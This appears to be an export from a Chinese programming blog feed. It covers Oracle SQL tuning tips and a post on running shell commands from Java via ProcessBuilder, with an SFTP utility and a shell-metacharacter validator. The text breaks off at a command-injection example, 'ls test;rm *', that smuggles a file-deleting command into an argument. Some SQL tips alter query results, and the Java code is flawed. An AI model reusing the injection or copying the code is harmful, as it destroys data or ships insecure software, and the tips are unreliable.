用Where子句替换HAVING子句：避免使用HAVING子句, HAVING 只会在检索出所有记录之后才对结果集进行过滤.这个处理需要排序,总计等操作.<br>如果能通过WHERE子句限制记录的数目,那就能减少这方面的开销.<br>(非oracle中)on、where、having这三个都可以加条件的子句中，on是最先执行，where次之，having最后，因为on是先把不符合条件的记录过滤后才进行统计，它就可以减少中间运算要处理的数据，按理说应该速度是最快的，where也应该比having快点的，因为它过滤数据后才进行sum，在两个表联接时才用on的，所以在一个表的时候，就剩下where跟having比较了。在这单表查询统计的情况下，如果要过滤的条件没有涉及到要计算字段，那它们的结果是一样的，只是where可以使用rushmore技术，而having就不能，在速度上后者要慢如果要涉及到计算的字段，就表示在没计算之前，这个字段的值是不确定的，根据上篇写的工作流程，where的作用时间是在计算之前就完成的，而having就是在计算后才起作用的，所以在这种情况下，两者的结果会不同。在多表联接查询时，on比where更早起作用。系统首先根据各个表之间的联接条件，把多个表合成一个临时表后，再由where进行过滤，然后再计算，计算完后再由having进行过滤。由此可见，要想过滤条件起到正确的作用，首先要明白这个条件应该在什么时候起作用，然后再决定放在那里<br>（12） 减少对表的查询：　在含有子查询的SQL语句中,要特别注意减少对表的查询.例子：　SELECT TAB_NAME FROM TABLES WHERE<br>　　(TAB_NAME,DB_VER) =( SELECT　TAB_NAME,DB_VER FROM TAB_COLUMNS WHERE VERSION = 604)<br>（13） 通过内部函数提高SQL效率.复杂的SQL往往牺牲了执行效率.能够掌握上面的运用函数解决问题的方法在实际工作中是非常有意义的<br>（14） 使用表的别名(Alias)：　当在SQL语句中连接多个表时, 请使用表的别名并把别名前缀于每个Column上.这样一来,就可以减少解析的时间并减少那些由Column歧义引起的语法错误.<br>（15） 用EXISTS替代IN、用NOT EXISTS替代NOT IN：　在许多基于基础表的查询中,为了满足一个条件,往往需要对另一个表进行联接.在这种情况下, 使用EXISTS(或NOT EXISTS)通常将提高查询的效率.<br>　　在子查询中,NOT IN子句将执行一个内部的排序和合并.<br>　　无论在哪种情况下,NOT IN都是最低效的<br>　　(因为它对子查询中的表执行了一个全表遍历).<br>　　为了避免使用NOT IN ,我们可以把它改写成外连接(Outer Joins)或NOT EXISTS.<br>　　例子：　（高效）SELECT * FROM EMP<br>　　(基础表) WHERE EMPNO &gt; 0 AND EXISTS<br>　　(SELECT ‘X’ FROM DEPT WHERE DEPT.DEPTNO = EMP.DEPTNO AND LOC = ‘MELB’)　(低效)SELECT * FROM EMP<br>　　(基础表) WHERE EMPNO &gt; 0 AND DEPTNO IN(SELECT DEPTNO FROM DEPT WHERE LOC = ‘MELB’)<br>（16） 识别’低效执行’的SQL语句：　虽然目前各种关于SQL优化的图形化工具层出不穷,但是写出自己的SQL工具来解决问题始终是一个最好的方法：　SELECT EXECUTIONS , DISK_READS, BUFFER_GETS, ROUND((BUFFER_GETS-DISK_READS)/BUFFER_GETS,2) Hit_radio, ROUND(DISK_READS/EXECUTIONS,2) Reads_per_run, SQL_TEXT FROM V$SQLAREA WHERE EXECUTIONS&gt;0 AND BUFFER_GETS &gt; 0 AND<br>　　(BUFFER_GETS-DISK_READS)/BUFFER_GETS &lt; 0.8 ORDER BY 4 DESC;<br>（17） 用索引提高效率：　索引是表的一个概念部分,用来提高检索数据的效率，ORACLE使用了一个复杂的自平衡B-tree结构.<br>　　通常,通过索引查询数据比全表扫描要快.<br>　　当ORACLE找出执行查询和Update语句的最佳路径时, ORACLE优化器将使用索引.<br>　　同样在联结多个表时使用索引也可以提高效率.<br>　　另一个使用索引的好处是,它提供了主键(primary key)的唯一性验证.<br>　　。那些LONG或LONG RAW数据类型, 你可以索引几乎所有的列.<br>　　通常, 在大型表中使用索引特别有效.<br>　　当然,你也会发现, 在扫描小表时,使用索引同样能提高效率.<br>　　虽然使用索引能得到查询效率的提高,但是我们也必须注意到它的代价.<br>　　索引需要空间来存储,也需要定期维护, 每当有记录在表中增减或索引列被修改时, 索引本身也会被修改.<br>　　这意味着每条记录的INSERT , DELETE , UPDATE将为此多付出4 , 5 次的磁盘I/O .<br>　　因为索引需要额外的存储空间和处理,那些不必要的索引反而会使查询反应时间变慢.<br>　　。定期的重构索引是有必要的.<br>　　：　ALTER INDEX<indexname>REBUILD<tablespacename><br>（18） 用EXISTS替换DISTINCT：　当提交一个包含一对多表信息(比如部门表和雇员表)的查询时,避免在SELECT子句中使用DISTINCT.<br>　　一般可以考虑用EXIST替换, EXISTS 使查询更为迅速,因为RDBMS核心模块将在子查询的条件一旦满足后,立刻返回结果.<br>　　例子：<br>　　(低效): SELECT DISTINCT DEPT_NO,DEPT_NAME FROM DEPT D , EMP E WHERE D.DEPT_NO = E.DEPT_NO<br>　　(高效): SELECT DEPT_NO,DEPT_NAME FROM DEPT D WHERE EXISTS<br>　　( SELECT ‘X’ FROM EMP E WHERE E.DEPT_NO = D.DEPT_NO);<br>（19） sql语句用大写的；因为oracle总是先解析sql语句，把小写的字母转换成大写的再执行　<br>（20） 在java代码中尽量少用连接符“＋”连接字符串！<br>（21） 避免在索引列上使用NOT 通常，　我们要避免在索引列上使用NOT, NOT会产生在和在索引列上使用函数相同的影响.<br>　　当ORACLE”遇到”NOT,他就会停止使用索引转而执行全表扫描.<br>（22） 避免在索引列上使用计算．　WHERE子句中，如果索引列是函数的一部分．优化器将不使用索引而使用全表扫描． 举例: 低效： SELECT … FROM DEPT WHERE SAL * 12 &gt; 25000; 高效: SELECT … FROM DEPT WHERE SAL &gt; 25000/12;<br>（23） 用&gt;=替代&gt;　高效: SELECT * FROM EMP WHERE DEPTNO &gt;=4 低效: SELECT * FROM EMP WHERE DEPTNO &gt;3 两者的区别在于, 前者DBMS将直接跳到第一个DEPT等于4的记录而后者将首先定位到DEPTNO=3的记录并且向前扫描到第一个DEPT大于3的记录.<br>（24） 用UNION替换OR<br>　　(适用于索引列)　通常情况下, 用UNION替换WHERE子句中的OR将会起到较好的效果.<br>　　对索引列使用OR将造成全表扫描.<br>　　注意, 以上规则只针对多个索引列有效.<br>　　如果有column没有被索引, 查询效率可能会因为你没有选择OR而降低.<br>　　在下面的例子中, LOC_ID 和REGION上都建有索引.<br>　　高效: SELECT LOC_ID , LOC_DESC , REGION FROM LOCATION WHERE LOC_ID = 10 UNION SELECT LOC_ID , LOC_DESC , REGION FROM LOCATION WHERE REGION = “MELBOURNE” 低效: SELECT LOC_ID , LOC_DESC , REGION FROM LOCATION WHERE LOC_ID = 10 OR REGION = “MELBOURNE” 如果你坚持要用OR, 那就需要返回记录最少的索引列写在最前面.<br>（25） 用IN来替换OR 这是一条简单易记的规则，但是实际的执行效果还须检验，在ORACLE8i下，两者的执行路径似乎是相同的．　低效: SELECT….<br>　　FROM LOCATION WHERE LOC_ID = 10 OR LOC_ID = 20 OR LOC_ID = 30 高效 SELECT… FROM LOCATION WHERE LOC_IN IN　　(10,20,30);　<br>（26） 避免在索引列上使用IS NULL和IS NOT NULL　避免在索引中使用任何可以为空的列，ORACLE将无法使用该索引．对于单列索引，如果列包含空值，索引中将不存在此记录.<br>　　对于复合索引，如果每个列都为空，索引中同样不存在此记录.如果至少有一个列不为空，则记录存在于索引中．举例: 如果唯一性索引建立在表的A列和B列上, 并且表中存在一条记录的A,B值为(123,null) , ORACLE将不接受下一条具有相同A,B值（123,null）的记录(插入).然而如果所有的索引列都为空，ORACLE将认为整个键值为空而空不等于空.　　因此你可以插入1000 条具有相同键值的记录,当然它们都是空! 因为空值不存在于索引列中,所以WHERE子句中对索引列进行空值比较将使ORACLE停用该索引.<br>　　低效:<br>　　(索引失效) SELECT … FROM DEPARTMENT WHERE DEPT_CODE IS NOT NULL;<br>高效:<br>　　(索引有效) SELECT … FROM DEPARTMENT WHERE DEPT_CODE &gt;=0;<br>（27） 总是使用索引的第一个列：　如果索引是建立在多个列上, 只有在它的第一个列(leading column)被where子句引用时,优化器才会选择使用该索引.<br>　　这也是一条简单而重要的规则，当仅引用索引的第二个列时,优化器使用了全表扫描而忽略了索引<br>（28） 用UNION-ALL 替换UNION<br>　　( 如果有可能的话)：　当SQL语句需要UNION两个查询结果集合时,这两个结果集合会以UNION-ALL的方式被合并, 然后在输出最终结果前进行排序.<br>　　如果用UNION ALL替代UNION, 这样排序就不是必要了.<br>　　效率就会因此得到提高.<br>　　需要注意的是，UNION ALL 将重复输出两个结果集合中相同记录.<br>　　因此各位还是要从业务需求分析使用UNION ALL的可行性.<br>　　UNION 将对结果集合排序,这个操作会使用到SORT_AREA_SIZE这块内存.<br>　　对于这块内存的优化也是相当重要的.<br>　　下面的SQL可以用来查询排序的消耗量　低效： SELECT ACCT_NUM, BALANCE_AMT FROM DEBIT_TRANSACTIONS WHERE TRAN_DATE = ’31-DEC-95’ UNION SELECT ACCT_NUM, BALANCE_AMT FROM DEBIT_TRANSACTIONS WHERE TRAN_DATE = ’31-DEC-95’ 高效: SELECT ACCT_NUM, BALANCE_AMT FROM DEBIT_TRANSACTIONS WHERE TRAN_DATE = ’31-DEC-95’ UNION ALL SELECT ACCT_NUM, BALANCE_AMT FROM DEBIT_TRANSACTIONS WHERE TRAN_DATE = ’31-DEC-95’　（29） 用WHERE替代ORDER BY：　ORDER BY 子句只在两种严格的条件下使用索引.<br>　　ORDER BY中所有的列必须包含在相同的索引中并保持在索引中的排列顺序.<br>　　ORDER BY中所有的列必须定义为非空.<br>　　WHERE子句使用的索引和ORDER BY子句中所使用的索引不能并列.<br>　　例如: 表DEPT包含以下列: DEPT_CODE PK NOT NULL DEPT_DESC NOT NULL DEPT_TYPE NULL　低效:<br>　　(索引不被使用) SELECT DEPT_CODE FROM DEPT ORDER BY DEPT_TYPE 高效:<br>　(使用索引) SELECT DEPT_CODE FROM DEPT WHERE DEPT_TYPE &gt; 0<br>（30） 避免改变索引列的类型.<br>　　:　当比较不同数据类型的数据时, ORACLE自动对列进行简单的类型转换.<br>　　假设 EMPNO是一个数值类型的索引列.<br>　　SELECT … FROM EMP WHERE EMPNO = ‘123’ 实际上,经过ORACLE类型转换, 语句转化为: SELECT … FROM EMP WHERE EMPNO = TO_NUMBER(‘123’) 幸运的是,类型转换没有发生在索引列上,索引的用途没有被改变.<br>　　现在,假设EMP_TYPE是一个字符类型的索引列.<br>　　SELECT … FROM EMP WHERE EMP_TYPE = 123 这个语句被ORACLE转换为: SELECT … FROM EMP WHERETO_NUMBER(EMP_TYPE)=123 因为内部发生的类型转换, 这个索引将不会被用到! 为了避免ORACLE对你的SQL进行隐式的类型转换, 最好把类型转换用显式表现出来.<br>　　注意当字符和数值比较时, ORACLE会优先转换数值类型到字符类型<br>（31） 需要当心的WHERE子句:　某些SELECT 语句中的WHERE子句不使用索引.<br>　　这里有一些例子.<br>　　在下面的例子里,<br>　　(1)‘!=’ 将不使用索引.<br>　　记住, 索引只能告诉你什么存在于表中, 而不能告诉你什么不存在于表中.<br>　　(2) ‘||’是字符连接函数.<br>　　就象其他函数那样, 停用了索引.<br>　　(3) ‘+’是数学函数.<br>　　就象其他数学函数那样, 停用了索引.<br>　　(4)相同的索引列不能互相比较,这将会启用全表扫描.<br>（32） a.如果检索数据量超过30%的表中记录数.使用索引将没有显着的效率提高.<br>b.在特定情况下, 使用索引也许会比全表扫描慢, 但这是同一个数量级上的区别.<br>　　而通常情况下,使用索引比全表扫描要块几倍乃至几千倍!<br>（33） 避免使用耗费资源的操作:　带有DISTINCT,UNION,MINUS,INTERSECT,ORDER BY的SQL语句会启动SQL引擎 执行耗费资源的排序(SORT)功能.<br>　　DISTINCT需要一次排序操作, 而其他的至少需要执行两次排序.<br>　　通常, 带有UNION, MINUS , INTERSECT的SQL语句都可以用其他方式重写.<br>　　如果你的数据库的SORT_AREA_SIZE调配得好, 使用UNION , MINUS, INTERSECT也是可以考虑的, 毕竟它们的可读性很强<br>（34） 优化GROUP BY:　提高GROUP BY 语句的效率, 可以通过将不需要的记录在GROUP BY 之前过滤掉.下面两个查询返回相同结果但第二个明显就快了许多.<br>　　低效: SELECT JOB , AVG(SAL) FROM EMP GROUP JOB HAVING JOB = ‘PRESIDENT’ OR JOB = ‘MANAGER’ 高效: SELECT JOB , AVG(SAL) FROM EMP WHERE JOB = ‘PRESIDENT’ OR JOB = ‘MANAGER’ GROUP JOB</tablespacename></indexname></p><p><a href="https://www.ibm.com/developerworks/community/wikis/home?lang=zh#!/wiki/oracle/page/oracle%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96">原文链接</a></p>]]></content>
      <categories>
        <category>oracle</category>
      </categories>
      <tags>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>简单使用processbuilder执行shell命令-调用SFTP</title>
    <url>/2017/07/18/processbuilder-exec-shell/</url>
    <content><![CDATA[<h2 id="ProcessBuilder-start-和-Runtime-exec"><a href="#ProcessBuilder-start-和-Runtime-exec" class="headerlink" title="ProcessBuilder.start()和 Runtime.exec()"></a>ProcessBuilder.start()和 Runtime.exec()</h2><h3 id="相同：都可获取Process实例"><a href="#相同：都可获取Process实例" class="headerlink" title="相同：都可获取Process实例"></a>相同：都可获取Process实例</h3><p>ProcessBuilder.start() 和 Runtime.exec() 方法都被用来<code>创建一个操作系统进程（执行命令行操作），并返回 Process 子类的一个实例</code>，该实例可用来控制进程状态并获得相关信息。</p><p>每个ProcessBuilder实例管理一个进程属性集。ProcessBuilder的start()方法利用这些属性创建一个新的Process实例。start()方法可以从同一实例重复调用，以利用相同或者相关的属性创建新的子进程。</p><h3 id="Process类"><a href="#Process类" class="headerlink" title="Process类"></a>Process类</h3><p>Process 类提供了<code>执行从进程输入、执行输出到进程、等待进程完成、检查进程的退出状态以及销毁（杀掉）进程</code>的方法。创建进程的方法<code>可能无法针对某些本机平台上的特定进程很好地工作</code>，比如，本机窗口进程，守护进程，Microsoft Windows 上的 Win16/DOS 进程，或者 shell 脚本。创建的子进程没有自己的终端或控制台。它的所有标准 io（即 stdin、stdout 和 stderr）操作都将通过三个流 (getOutputStream()、getInputStream() 和 getErrorStream()) <code>重定向到父进程</code>。父进程使用这些流来提供到子进程的输入和获得从子进程的输出。<code>因为有些本机平台仅针对标准输入和输出流提供有限的缓冲区大小，如果读写子 进程的输出流或输入流迅速出现失败，则可能导致子进程阻塞，甚至产生死锁</code>。 当没有 Process 对象的更多引用时，不是删掉子进程，而是继续异步执行子进程。 对于带有 Process 对象的 Java 进程，没有必要异步或并发执行由 Process 对象表示的进程。</p><h3 id="不同点：参数不同，ProcessBuilder更多控制"><a href="#不同点：参数不同，ProcessBuilder更多控制" class="headerlink" title="不同点：参数不同，ProcessBuilder更多控制"></a>不同点：参数不同，ProcessBuilder更多控制</h3><p>ProcessBuilder.start() 和 Runtime.exec()<code>传递的参数有所不同</code>，Runtime.exec()可接受一个单独的字符串，这个字符串是通过空格来分隔可执行命令程序和参数的；也可以接受字符串数组参数。而ProcessBuilder的构造函数是一个字符串列表或者数组。列表中第一个参数是可执行命令程序，其他的是命令行执行是需要的参数。<br>通过查看JDK源码可知，<code>Runtime.exec最终是通过调用ProcessBuilder来真正执行操作的,以ProcessBuilder里用ProcessImpl,start 的一个子进程执行命令,</code>。</p><p>ProcessBuilder为进程提供了更多的控制，例如，可以设置当前工作目录，还可以改变环境参数。而Process的功能相对来说简单的多。<br>ProcessBuilder是一个final类，有两个带参数的构造方法，你可以通过构造方法来直接创建ProcessBuilder的对象。而Process是一个抽象类，一般都通过Runtime.exec()和ProcessBuilder.start()来间接创建其实例。</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><ol><li>修改进程构建器的属性将影响后续由该对象的 start() 方法启动的进程，但从不会影响以前启动的进程或 Java 自身的进程。</li><li>ProcessBuilder类不是同步的。如果多个线程同时访问一个 ProcessBuilder，而其中至少一个线程从结构上修改了其中一个属性，它必须 保持外部同步。</li><li>当没有 Process 对象的更多引用时，不是删掉子进程，而是继续异步执行子进程。 对于带有 Process 对象的 Java 进程，没有必要异步或并发执行由 Process 对象表示的进程。</li></ol><h2 id="使用ProcessBuilder执行shell命令，示例SFTP"><a href="#使用ProcessBuilder执行shell命令，示例SFTP" class="headerlink" title="使用ProcessBuilder执行shell命令，示例SFTP"></a>使用ProcessBuilder执行shell命令，示例SFTP</h2><p>Java示例如下，sftp.properties中四个参数如代码所示。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 项目名称：</span></span><br><span class="line"><span class="comment"> * Created by YZ on 2017-7-17 16:49.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SFTPProcessUtil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Logger logger = LoggerFactory.getLogger(SFTPProcessUtil<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PropertyResourceBundle perperty = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String sftpDir = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">ls</span><span class="params">()</span></span>&#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (perperty == <span class="keyword">null</span>)</span><br><span class="line">            perperty = (PropertyResourceBundle) ResourceBundle.getBundle(<span class="string">"sftp"</span>);</span><br><span class="line">        String curNormalUser = perperty.getString(<span class="string">"sftp.curNormalUser"</span>);</span><br><span class="line">        String sftpUser = perperty.getString(<span class="string">"sftp.user"</span>);</span><br><span class="line">        String sftpHost = perperty.getString(<span class="string">"sftp.host"</span>);</span><br><span class="line">        <span class="keyword">if</span> (sftpDir == <span class="keyword">null</span>)</span><br><span class="line">            sftpDir = perperty.getString(<span class="string">"sftp.dir"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(regexStr(curNormalUser,sftpUser,sftpHost,sftpDir)))&#123;</span><br><span class="line">            logger.error(<span class="string">"SFTPProcessUtil regexStr failed,please check:["</span>+curNormalUser+<span class="string">"],["</span>+sftpUser+<span class="string">"],["</span>+sftpHost+<span class="string">"],["</span>+sftpDir+<span class="string">"]"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curNormalUser = curNormalUser.trim();</span><br><span class="line">        sftpUser = sftpUser.trim();</span><br><span class="line">        sftpHost = sftpHost.trim();</span><br><span class="line">        sftpDir = sftpDir.trim();</span><br><span class="line"></span><br><span class="line">        ProcessBuilder check = <span class="keyword">null</span>;</span><br><span class="line">        InputStream is =<span class="keyword">null</span>;</span><br><span class="line">        Process process = <span class="keyword">null</span>;</span><br><span class="line">        BufferedReader br = <span class="keyword">null</span>;</span><br><span class="line">        OutputStream os = <span class="keyword">null</span>;</span><br><span class="line">        BufferedWriter bw = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            check = <span class="keyword">new</span> ProcessBuilder(<span class="string">"whoami"</span>);</span><br><span class="line">            process = check.start();</span><br><span class="line">            <span class="keyword">if</span> (process.waitFor() == <span class="number">0</span>)&#123;</span><br><span class="line">                is = process.getInputStream();</span><br><span class="line">                br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is,<span class="string">"UTF-8"</span>));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">if</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    logger.info(<span class="string">"ProcessBuilder Result:"</span>+line);</span><br><span class="line">                    <span class="keyword">if</span> (!curNormalUser.equalsIgnoreCase(line.trim()))&#123;</span><br><span class="line">                        <span class="keyword">if</span> (!<span class="string">"root"</span>.equals(line.trim()))&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            closeProcess(process,br,bw);</span><br><span class="line">                            check = <span class="keyword">new</span> ProcessBuilder(<span class="string">"su"</span>,curNormalUser);</span><br><span class="line">                            process = check.start();</span><br><span class="line">                            os = process.getOutputStream();</span><br><span class="line">                            bw = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> OutputStreamWriter(os,<span class="string">"UTF-8"</span>));</span><br><span class="line">                            bw.write(<span class="string">"sftp "</span> + sftpUser+<span class="string">"@"</span>+sftpHost+<span class="string">"&lt;&lt;!\n"</span>);</span><br><span class="line">                            bw.write(<span class="string">"ls "</span>+ sftpDir + <span class="string">"\n"</span>);</span><br><span class="line">                            bw.write(<span class="string">"bye\n"</span>);</span><br><span class="line">                            bw.write(<span class="string">"!\n"</span>);</span><br><span class="line">                            bw.write(<span class="string">"exit\n"</span>);</span><br><span class="line">                            bw.flush();</span><br><span class="line">                            is = process.getInputStream();</span><br><span class="line">                            br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is,<span class="string">"UTF-8"</span>));</span><br><span class="line">                            line = <span class="keyword">null</span>;</span><br><span class="line">                            list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">                            <span class="keyword">while</span>((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                                logger.info(<span class="string">"ProcessBuilder Result:"</span>+line);</span><br><span class="line">                                <span class="keyword">if</span>(!(line.startsWith(<span class="string">"sftp&gt; ls"</span>) || line.startsWith(<span class="string">"sftp&gt; bye"</span>)))&#123;</span><br><span class="line">                                    list.add(line.substring(line.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>,line.length()));</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        closeProcess(process,br,bw);</span><br><span class="line">                        check = <span class="keyword">new</span> ProcessBuilder(<span class="string">"sftp"</span>,sftpUser+<span class="string">"@"</span>+sftpHost,<span class="string">"&lt;&lt;!\n"</span>);</span><br><span class="line">                        process = check.start();</span><br><span class="line">                        os = process.getOutputStream();</span><br><span class="line">                        bw = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> OutputStreamWriter(os,<span class="string">"UTF-8"</span>));</span><br><span class="line">                        bw.write(<span class="string">"ls "</span> + sftpDir + <span class="string">"\n"</span>);</span><br><span class="line">                        bw.write(<span class="string">"bye\n"</span>);</span><br><span class="line">                        bw.write(<span class="string">"!\n"</span>);</span><br><span class="line">                        bw.flush();</span><br><span class="line">                        is = process.getInputStream();</span><br><span class="line">                        br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is,<span class="string">"UTF-8"</span>));</span><br><span class="line">                        line = <span class="keyword">null</span>;</span><br><span class="line">                        list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">                        <span class="keyword">while</span>((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                            logger.info(<span class="string">"ProcessBuilder Result:"</span>+line);</span><br><span class="line">                            <span class="keyword">if</span>(!(line.startsWith(<span class="string">"sftp&gt; ls"</span>) || line.startsWith(<span class="string">"sftp&gt; bye"</span>)))&#123;</span><br><span class="line">                                list.add(line.substring(line.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>,line.length()));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                is = process.getErrorStream();</span><br><span class="line">                br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is,<span class="string">"UTF-8"</span>));</span><br><span class="line">                String line;</span><br><span class="line">                logger.error(<span class="string">"shell exec error begin"</span>);</span><br><span class="line">                <span class="keyword">while</span>((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    logger.error(line);</span><br><span class="line">                &#125;</span><br><span class="line">                logger.error(<span class="string">"shell exec error end"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (list != <span class="keyword">null</span>)&#123;</span><br><span class="line">                Collections.reverse(list);</span><br><span class="line">                <span class="keyword">for</span> (String s:list</span><br><span class="line">                     ) &#123;</span><br><span class="line">                    logger.info(<span class="string">"SFTPProcessUtil.ls() retrun:"</span>+s);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(<span class="string">"ProcessBuilder IOException:"</span>,e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            logger.error(<span class="string">"ProcessBuilder InterruptedException:"</span>,e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            logger.error(<span class="string">"ProcessBuilder Exception:"</span>,e);</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                closeProcess(process,br,bw);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                logger.error(<span class="string">"ProcessBuilder closeProcess:"</span>,e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">closeProcess</span><span class="params">(Process process, BufferedReader br, BufferedWriter bw)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (br != <span class="keyword">null</span>)</span><br><span class="line">            br.close();</span><br><span class="line">        <span class="keyword">if</span> (bw != <span class="keyword">null</span>)</span><br><span class="line">            bw.close();</span><br><span class="line">        <span class="keyword">if</span> (process != <span class="keyword">null</span>)</span><br><span class="line">            process.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 验证配置文件中的参数是否可用</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> strs</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">regexStr</span><span class="params">(String... strs)</span></span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> regex = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(String str:strs)&#123;</span><br><span class="line">            <span class="keyword">if</span> (str == <span class="keyword">null</span>) &#123;regex = <span class="keyword">false</span>; <span class="keyword">return</span> <span class="keyword">false</span>;&#125;</span><br><span class="line">            <span class="keyword">if</span>(str.matches(<span class="string">"[\t\n\r\f\u0000|;&amp;$&gt;&lt;`\\!~]+"</span>)) &#123;regex = <span class="keyword">false</span>;<span class="keyword">return</span> <span class="keyword">false</span>;&#125;</span><br><span class="line">            str = str.trim();</span><br><span class="line">            str = str.replaceAll(<span class="string">"[\u4E00-\u9FA5a-zA-Z0-9._-]"</span>,<span class="string">""</span>);</span><br><span class="line">            str = str.replaceAll(<span class="string">"[?/\\x22]"</span>,<span class="string">""</span>);</span><br><span class="line">            regex = regex &amp;&amp; <span class="string">""</span>.equals(str.trim());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> regex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PS：如果是root用户，需要跳转到普通用户。使用su 用户名，跳转时不需要使用输入重定向。但是在操作完后，记得使用exit退出。使用sftp命令时，可以使用<code>&lt;&lt;</code>将输入重定向，并约定结束标记，例如<code>&lt;&lt;!\n</code>，结束时，即需要使用<code>!\n</code>。<br><code>ls dir</code> dir 可输入如<code>/user/????.xml</code></p><p>下面是一个利用修改过的工作目录和环境启动进程的例子：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(<span class="string">"myCommand"</span>, <span class="string">"myArg1"</span>, <span class="string">"myArg2"</span>);</span><br><span class="line"><span class="comment">//切换当前 Process p = pb.start();的环境</span></span><br><span class="line">Map&lt;String, String&gt; env = pb.environment();</span><br><span class="line">env.put(<span class="string">"VAR1"</span>, <span class="string">"myValue"</span>);</span><br><span class="line">env.remove(<span class="string">"OTHERVAR"</span>);</span><br><span class="line">env.put(<span class="string">"VAR2"</span>, env.get(<span class="string">"VAR1"</span>) + <span class="string">"suffix"</span>);</span><br><span class="line"><span class="comment">//切换工作目录</span></span><br><span class="line">pb.directory(<span class="string">"myDir"</span>);</span><br><span class="line">Process p = pb.start();</span><br></pre></td></tr></table></figure><p>要利用一组明确的环境变量启动进程，在添加环境变量之前，首先调用 Map.clear()。</p><h2 id="Java中的命令注入"><a href="#Java中的命令注入" class="headerlink" title="Java中的命令注入"></a>Java中的命令注入</h2><p>Java的native调用<br>a. Windows是CreateProcessW 创建子进程执行命令<br>b. Unix中以enecve 来创建子进程执行命令</p><p>Java并没有使用system函数进行创建子进程执行命令，通常我们也知道system的函数非常容易发生注入风险，比如system(“ls “+”test;rm *); 